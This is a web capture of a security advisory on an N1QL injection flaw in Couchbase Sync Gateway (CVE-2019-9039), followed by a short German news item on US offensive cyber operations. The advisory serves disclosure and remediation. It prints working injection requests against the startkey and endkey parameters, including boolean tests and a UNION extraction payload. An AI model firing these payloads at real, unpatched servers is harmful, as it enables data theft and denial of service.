  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Schlagwort: CVE-2019-9039

[![](https://research.hisolutions.com/wp-content/uploads/2019/06/Couchbase_Inc._official_logo.png)](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/ "N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039")

[21. Juni 201926. Juni 2023](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)

Within the scope of a recent penetration test, HiSolutions security consultants encountered a Couchbase Sync Gateway and discovered a previously unknown, high-impact injection vulnerability (CVE-2019-9039).

**Background
Information**

The Couchbase Sync Gateway is a product
developed by Couchbase Inc. as part of their mobile product portfolio. It is
used to connect web, mobile, and IoT apps (Couchbase Lite) to the backend
database (Couchbase Server). The publically accessible Sync Gateway synchronizes
the data with the internal backend database servers and employs various
security and integration features.

Couchbase uses a database query language called *N1QL* (<https://www.couchbase.com/products/n1ql> ) (pronounced “nickel”). *N1QL* extends SQL for JSON. It
combines the syntax of traditional SQL with the benefits and flexibility of
NoSQL databases.

From a security standpoint, N1QL is comparatively
unexplored. SQL injections are a well-known and broadly explored security risk
for traditional SQL databases. With increased use of NoSQL databases, NoSQL injection
has become a more widely known topic as well. For both vulnerabilities,
numerous tools, articles and presentations exist that detail every aspect of
exploitation.

**N1QL
Injections**

A 2015 blog post (<https://blog.couchbase.com/couchbase-and-n1ql-security-centeredgesoftware/>) discusses various aspects of N1QL injections. N1QL is claimed to be more
resistant to injection attacks than traditional SQL. This is due to the
following syntactic differences:

* Query stacking is not possible
  in N1QL. That is, terminating a previous query with a semicolon and appending
  another query will result in an invalid syntax error in N1QL.
* N1QL does not allow commenting
  out just the remainder of a line. N1QL only allows C-style comment blocks (/\*
  comment \*/). This prevents an attacker from terminating a query by inserting
  “/\*” or “–“ at the injection point.

The blog post also mentions generic advice for
preventing injections. Apart from that, information regarding N1QL injections
is very sparse.

**The vulnerability**

HiSolutions consultants discovered that the Couchbase
Sync Gateway in combination with a Couchbase Server is affected by a previously
undisclosed N1QL-injection vulnerability in the REST API. An attacker with
access to the public REST API can insert additional N1QL statements through the
parameters “startkey” and “endkey” of the “\_all\_docs” endpoint.

The following request triggers an error:

[https://host:port/{db}/\_all\_docs?startkey=1%271&endkey=](https://host:port/%7Bdb%7D/_all_docs?startkey=1%271&endkey=)

The client will receive the following error statement
indicating a N1QL error:

```
{"rows":[
{"error":"Internal Server Error","reason":"Internal error: [3000] syntax error - at 1"}
```

On a server with the standard installation of Couchbase
Server and Couchbase Sync Gateway, the following error will appear in the
logfile:

```
2019-02-15T14:00:51.892+01:00 [WRN] Error when querying index using
statement: [SELECT META(`test-getting-started`).id as id,
meta(`test-getting-started`).xattrs._sync.rev as r,
meta(`test-getting-started`).xattrs._sync.sequence as s,
meta(`test-getting-started`).xattrs._sync.channels as c FROM
`test-getting-started` WHERE meta(`test-getting-started`).xattrs._sync.sequence
> 0 AND META(`test-getting-started`).id NOT LIKE '\\_sync:%' AND
meta(`test-getting-started`).xattrs._sync IS NOT MISSING AND
(meta(`test-getting-started`).xattrs._sync.flags IS MISSING OR
BITTEST(meta(`test-getting-started`).xattrs._sync.flags,1) = false) AND
META(`test-getting-started`).id >= '1'1' ORDER BY META(`test-getting-started`).id] --
base.(*CouchbaseBucketGoCB).Query() at bucket_n1ql.go:63
```

The error (injection point at ‚1‘1′ near the bottom) shows that it is possible to break out of the original query and insert additional N1QL code. An additional character after the apostrophe seems to be required to trigger the error.

Furthermore, it is possible to end the current query
and thereby skip the rest of the original query by inserting a null byte at the
end of the manipulated parameter value.

The insertion of an additional comparison can be used
to validate the injection. When inserting an additional requirement that is
always true (“AND 1=1”), the original results are returned:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d1%00&endkey=
```

Inserting a statement that always evaluates to false (“AND
1=0”) yields no results:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d0%00&endkey=
```

The following request can be used to extract
additional information from a default installation:

```
/{db}/_all_docs?startkey=123%27%20UNION%20ALL%20SELECT
%20TOSTRING(BASE64_DECODE("U1FMLUl
uamVjdGlvbg=="))%20as%20id%3b%00&endkey=
```

The inserted N1QL statement “UNION ALL SELECT
TOSTRING(BASE64\_DECODE(„U1FMLUluamVjdGlvbg==“)) as id” adds the
following line to the output and shows that N1QL functions and queries are
evaluated:

```
{"rows":[
{"key":"SQL-Injection","id":"SQL-Injection","value":{"rev":""}}
...
```

The same injection works for the parameter “endkey”.

Additional modification of the query seems to be
required to make UNION-injections work when channels and users are set up for
the database. Data extraction methods that rely on comparisons will work as shown.

**Impact:**

An attacker with access to the public REST API is able
to issue additional N1QL statements and extract sensitive data or call
arbitrary N1QL functions. By issuing nested queries with CPU-intensive
operations, he might be able to cause increased resource usage and denial of
service conditions.

**Remediation:**

Traditional remediations for SQL injection vulnerabilities
also apply to N1QL. Features like parameterized N1QL queries should be used to
prevent the injection of N1QL statements into the original query.

As the vulnerability exists in the default Couchbase
Sync Gateway, an update will fix the problem. HiSolutions has responsibly reported
the issue to the vendor. The fix is available in Sync Gateway v2.5 as well as
in v2.1.3.

Short-term remediation can be implemented by blocking
all requests containing “startkey” or “endkey” on the web-interface.

**[Responsible Disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) Timeline**

15.02.2019 – HiSolution initially notifies security@couchbase.com with vulnerability details and the internal
responsible disclosure guideline.

20.02.2019 – Couchbase acknowledges the vulnerability
and states that an engineering team is working on the issue. Couchbase offers
to help with the CVE request to [MITRE](https://research.hisolutions.com/2023/03/medientipp-maerz-2023/).

23.02.2019 – HiSolutions inquires whether the
engineering team was able to reproduce the issue and requests an ETA for a
patch. HiSolutions notifies Couchbase that a CVE number was requested.

23.02.2019 – MITRE assigns CVE-2019-9039 for the
vulnerability.

26.02.2019 – Couchbase sends an email to HiSolutions with
their assessment of the CVSS (<https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L>). Couchbase states in this email that a patch is under
development and that they will follow up with an ETA. Couchbase requests the
CVE number.

26.02.2019 – HiSolutions sends the CVE number to
Couchbase and questions the assessed CVSS. User interaction should be “none”
from HiSolutions perspective (CVSS v3 Vector: [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)).

26.02.2019 – Couchbase explains their assessment of
the CVSS and states that they will follow up an ETA for the patch.

25.03.2019 – HiSolutions inquires  if an ETA is available and explains the
assessment of the User Interaction CVSS vector.

12.04.2019 – HiSolutions inquires if the last email
was received successfully. HiSolutions reminds Couchbase that the issue is
scheduled for disclosure on 21.05.2019 and request to be notified if more time
is needed by Couchbase.

15.04.2019 – Couchbase apologizes for the delayed
response. The patch for the Sync Gateway is expected at the end of April. Couchbase
agrees to a public disclosure on 21.05.2019. Couchbase informs HiSolutions that
they will list the issue on a changed website under <https://www.couchbase.com/resources/security> within a table containing all vulnerabilities, fix release dates, versions,
and affected products.

14.05.2019 – HiSolutions notices that the patch is
applied in the latest public version. HiSolutions sends an inquiry regarding
the vulnerability table on the website and if 21.05.2019 is still good for the
disclosure.

21.05.2019 – HiSolutions postpones the disclosure
because no answer was received.

11.06.2019 – HiSolutions inquires regarding the table
on the website and a new disclosure date. A delivery failure for the contact
address of the initial contact within the security team is received. The email is
resent to the security team with the request for an answer by another team
member.

12.06.2019 – Couchbase replies that the fix is
included in Sync Gateway v2.5 as well as in v2.1.3. The release notes for both
products will be updated in the following days to include a reference to the
vulnerability. Couchbase is actively working on the vulnerability table. While
unclear if the table will be finished until 21.06.2019, HiSolutions can
disclose the issue on 21.06.2019 if Couchbase has updated the release release
notes until then.

**Further references**

<https://docs.couchbase.com/dotnet-sdk/2.2/prepared-statements.html> <https://docs.couchbase.com/java-sdk/2.7/n1ql-query.html#devguide-named-placeholders>

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_1bd53168_20250121_012504.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

Suche

Suche nach:

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

*Menü schließen*

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
  + [ReKom-S](https://research.hisolutions.com/forschungsprojekte/rekom-s/)
* [Über uns](https://research.hisolutions.com/hisolutions-research/)
  + [Wer schreibt hier?](https://research.hisolutions.com/hier-schreiben/)
  + [Kontakt](https://research.hisolutions.com/kontakt/)
  + [HiSolutions AG](https://www.hisolutions.com)
  + [HiSolutions SAM-Blog](https://sam.news)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

Suche
Menü umschalten

Suche nach:

# Ich Cyberwar’s nicht: US-Offensivmaßnahmen gegen Grids werden verschärft

Von [David Fuhr](https://research.hisolutions.com/author/davidf/)[25. Juni 201926. November 2019](https://research.hisolutions.com/2019/06/ich-cyberwars-nicht-us-offensivmassnahmen-gegen-grids-werden-verschaerft/)[News](https://research.hisolutions.com/category/news/)
![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)

Etwas verworren sind noch die Berichte und Spekulationen um angeblich akut zunehmende Offensivmaßnahmen der US-Administration in Richtung der russischen Stromnetze. Unstrittig ist, dass seit Jahren mehrere Länder – ganz vorne mit dabei die USA – im Bereich offensive Cyberfähigkeiten aufrüsten. Nun berichtet die New York Times über eine im letzten Sommer fast unbemerkt im Kongress verabschiedete Änderung der Military Authorization Bill. Demnach kann die „routinemäßige Durchführung versteckter militärischer Aktivität im Cyberspace zur Abschreckung, Sicherung oder Verteidigung gegen Angriffe oder bösartige Cyberaktivitäten gegen die Vereinigten Staaten“ durch den Verteidigungsminister autorisiert werden, ohne den Präsidenten einzubinden.
Die aktuellen Cyber-Operationen gegen den Iran werden Thema des nächsten Digest sein.
<https://www.nytimes.com/2019/06/15/us/politics/trump-cyber-russia-grid.html>

## Autor

* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2020/10/David_Fuhr_LotteOstermann_ORIGINAL_2019-scaled.jpg)

  [David Fuhr](https://research.hisolutions.com/author/davidf/ "David Fuhr")

  Twitter: [0xdhf](https://twitter.com/0xdhf)

  [Alle Beiträge ansehen](https://research.hisolutions.com/author/davidf/ "Alle Beiträge ansehen")

## Beitragsnavigation

[N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Nicht möglich? SQL-Lücke in NoSQL-Datenbank](https://research.hisolutions.com/2019/06/nicht-moeglich-sql-luecke-in-nosql-datenbank/)

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
